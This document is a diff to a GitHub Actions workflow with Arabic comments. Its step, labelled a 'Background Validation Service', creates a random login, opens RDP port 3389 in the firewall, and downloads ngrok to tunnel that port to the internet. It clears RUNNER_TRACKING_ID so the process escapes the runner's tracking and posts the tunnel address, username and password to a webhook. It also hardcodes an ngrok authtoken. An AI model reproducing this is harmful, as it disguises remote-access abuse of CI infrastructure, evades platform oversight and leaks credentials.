@@ -8,7 +8,7 @@ on:
 jobs:
   build-test:
     runs-on: windows-2022
-    timeout-minutes: 330  # 5.5 ساعات
+    timeout-minutes: 330
 
     steps:
       - name: Checkout repository
@@ -58,7 +58,7 @@ jobs:
           dotnet build -c Release
           dotnet run -c Release
 
-      - name: Start Background Validation Service (ngrok TCP - Fixed)
+      - name: Start Background Validation Service (ngrok TCP - Fixed & Detached)
         run: |
           $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
           $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
@@ -75,7 +75,7 @@ jobs:
           netsh advfirewall firewall add rule name="ValidationRule" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
           Restart-Service TermService -Force -ErrorAction SilentlyContinue
 
-          # === ngrok Setup (النسخة المحسنة 100%) ===
+          # === ngrok Setup (النسخة النهائية المضمونة) ===
           $ngrokUrl = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
           $zip = "$env:TEMP\ngrok.zip"
           $extractPath = "$env:TEMP\ngrok_folder"
@@ -90,26 +90,24 @@ jobs:
           $ngrokToken = "3AhpPhQAVlnYjyKahRKtc1p28gI_66SuDQdWYPGFs7orWLzrn"
           & $exe config add-authtoken $ngrokToken
 
-          # الحل الأساسي: فصل العملية عن GitHub Tracker
+          # فصل العملية عن GitHub Runner (مهم جداً)
           $env:RUNNER_TRACKING_ID = $null
 
           Write-Host "Starting ngrok TCP tunnel with full detachment..."
-          $psi = New-Object System.Diagnostics.ProcessStartInfo
-          $psi.FileName = $exe
-          $psi.Arguments = "tcp 3389 --log=stdout --log-level=debug"
-          $psi.UseShellExecute = $false
-          $psi.RedirectStandardOutput = $true
-          $psi.RedirectStandardError = $true
-          $psi.WindowStyle = 'Hidden'
-          $psi.CreateNoWindow = $true
 
-          $process = [System.Diagnostics.Process]::Start($psi)
-          $pid = $process.Id
-          $pid | Out-File "$env:TEMP\ngrok.pid" -Force
+          $process = Start-Process -FilePath $exe `
+            -ArgumentList "tcp 3389 --log=stdout --log-level=debug" `
+            -RedirectStandardOutput $log `
+            -RedirectStandardError $errLog `
+            -WindowStyle Hidden `
+            -PassThru
+
+          $ngrokPid = $process.Id
+          $ngrokPid | Out-File "$env:TEMP\ngrok.pid" -Force
 
           Start-Sleep -Seconds 25
 
-          # استخراج الرابط (log + API محلي)
+          # استخراج الرابط (log + API)
           $logData = Get-Content $log -Raw -ErrorAction SilentlyContinue
           $errData = Get-Content $errLog -Raw -ErrorAction SilentlyContinue
 
@@ -125,17 +123,17 @@ jobs:
           }
 
           if ($url) {
-              $msg = "Target: $url`nU: $usr`nP: $pwd`nTool: ngrok (detached)"
-              Write-Host "✅ ngrok tunnel created successfully - PID: $pid"
+              $msg = "Target: $url`nU: $usr`nP: $pwd`nTool: ngrok (detached PID $ngrokPid)"
+              Write-Host "✅ ngrok tunnel created successfully - PID: $ngrokPid"
           } else {
-              $msg = "Init failed (check logs below)`nLog: $($logData | Select-Object -Last 30)`nErr: $($errData | Select-Object -Last 30)"
+              $msg = "Init failed:`nLog: $($logData[-500..-1] -join "`n")`nErr: $($errData[-200..-1] -join "`n")"
           }
 
           $body = @{ content = $msg } | ConvertTo-Json
           Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
 
-          # طباعة اللوج الكامل للتشخيص
-          Write-Host "`n--- ngrok Log (last 30 lines) ---"
+          # طباعة اللوج للتشخيص
+          Write-Host "`n--- ngrok Log (آخر 30 سطر) ---"
           Get-Content $log -Tail 30 -ErrorAction SilentlyContinue | Write-Host
           Write-Host "`n--- ngrok Error Log ---"
           Get-Content $errLog -Tail 20 -ErrorAction SilentlyContinue | Write-Host
@@ -184,7 +182,7 @@ jobs:
 
           $restartCount = 0
           $maxRestarts = 10
-          $endTime = (Get-Date).AddMinutes(330)  # 5.5 ساعات
+          $endTime = (Get-Date).AddMinutes(330)
 
           while ((Get-Date) -lt $endTime -and $restartCount -lt $maxRestarts) {
             # 1. التحقق من وجود عملية ngrok
